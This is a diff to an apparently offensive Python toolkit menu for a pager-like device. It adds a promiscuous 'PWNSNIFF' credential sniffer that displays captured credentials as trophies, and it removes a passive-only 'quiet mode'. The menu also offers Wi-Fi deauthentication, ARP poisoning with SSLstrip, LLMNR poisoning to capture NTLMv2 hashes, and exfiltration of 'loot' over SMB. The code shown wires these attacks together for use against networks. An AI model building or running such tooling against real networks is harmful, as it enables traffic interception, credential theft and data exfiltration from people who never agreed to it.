@@ -16,10 +16,9 @@ Menu:
   WIFI SCAN        Passive 802.11 scanner (APs + client probes)
   WIFI DEAUTH      802.11 deauth attack with interactive target picker
   ARP POISON       ARP MitM + optional SSLstrip with live feed
+  PWNSNIFF         Passive promiscuous DPI sniffer
   EXFIL LOOT       Trigger LootOverSMB sync to home server
   VIEW LOOT        Browse captured loot files on-device
-  QUIET MODE       Toggle passive-only mode
-  PAGERGOTCHI      Quick launch PagerGotchi (by Brainphreak)
   EXIT
 
 Controls:
@@ -61,7 +60,7 @@ video_player = _try_import("video_player")
 wifi_scan     = _try_import("wifi_scan")
 wifi_deauth   = _try_import("wifi_deauth")
 arp_poison    = _try_import("arp_poison")
-pagergotchi   = _try_import("pagergotchi")
+pwn_sniff     = _try_import("pwn_sniff")
 
 
 # ── Config ───────────────────────────────────────────────────────────────────
@@ -73,7 +72,6 @@ CONFIG = {
     "SMB_SHARE":         "",
     "SMB_USER":          "",
     "SMB_PASS":          "",
-    "QUIET_MODE":        False,
     "PORT_SCAN_TIMEOUT": 1.0,
     "DISCOVERED":        {},
 }
@@ -248,12 +246,6 @@ def run_recon_sweep(config, ui_callback, stop_event):
     else:
         ui_callback("[RECON] Port Scan", "ARP module pending")
 
-    if config.get("QUIET_MODE"):
-        ui_callback("[QUIET MODE]", "Skipping port scan")
-        time.sleep(1)
-        CONFIG["_last_recon"] = results
-        return results
-
     # Phase 2: Port scan every ARP-discovered host (generic profile for all)
     targets = {ip: ip for ip in arp_results}
     if not targets:
@@ -348,18 +340,13 @@ def run_recon_sweep(config, ui_callback, stop_event):
 
 def run_llmnr_listen(config, ui_callback, stop_event):
     """LLMNR/NBT-NS poisoner — capture NTLMv2 hashes."""
-    if config.get("QUIET_MODE"):
-        ui_callback("[QUIET MODE]", "LLMNR disabled")
-        time.sleep(2)
-        return None
-
     if llmnr is None:
         ui_callback("LLMNR module", "Opus module pending")
         time.sleep(2)
         return None
 
-    ui_callback("[LLMNR] LISTENING", "Poisoning broadcasts...")
-    result = llmnr.run(config, ui_callback, stop_event)
+    pager_ref = _MENU.pager if _MENU else None
+    result = llmnr.run(config, ui_callback, stop_event, pager=pager_ref)
 
     if result and result.get("hashes"):
         for h in result["hashes"]:
@@ -608,15 +595,25 @@ def run_arp_poison(config, ui_callback, stop_event):
     return result
 
 
-def run_pagergotchi(config, ui_callback, stop_event):
-    """Quick launch PagerGotchi (by Brainphreak)."""
-    if pagergotchi is None:
-        ui_callback("PAGERGOTCHI", "Module not found")
+def run_pwn_sniff(config, ui_callback, stop_event):
+    """PwnSniff: passive promiscuous DPI sniffer."""
+    if pwn_sniff is None:
+        ui_callback("PWNSNIFF", "Module not found")
         time.sleep(2)
         return None
 
     pager_ref = _MENU.pager if _MENU else None
-    return pagergotchi.run(config, ui_callback, stop_event, pager=pager_ref)
+    result = pwn_sniff.run(config, ui_callback, stop_event, pager=pager_ref)
+
+    if result and result.get("creds") and _MENU:
+        creds = result["creds"]
+        _MENU.draw_trophy(
+            f"{len(creds)} CRED(S) SNIFFED",
+            creds[0][:36] if creds else "",
+            f"{result.get('packets', 0)} pkts ({result.get('duration', 0)}s)",
+        )
+
+    return result
 
 
 def run_exfil(config, ui_callback, stop_event):
@@ -712,10 +709,9 @@ def main():
             ("WIFI SCAN",           run_wifi_scan),
             ("WIFI DEAUTH",         run_wifi_deauth),
             ("ARP POISON",          run_arp_poison),
+            ("PWNSNIFF",            run_pwn_sniff),
             ("EXFIL LOOT",          run_exfil),
             ("VIEW LOOT",           run_view_loot),
-            ("QUIET MODE [OFF]",    None),
-            ("QUICK LAUNCH: PAGERGOTCHI", run_pagergotchi),
             ("EXIT",                None),
         ]
 
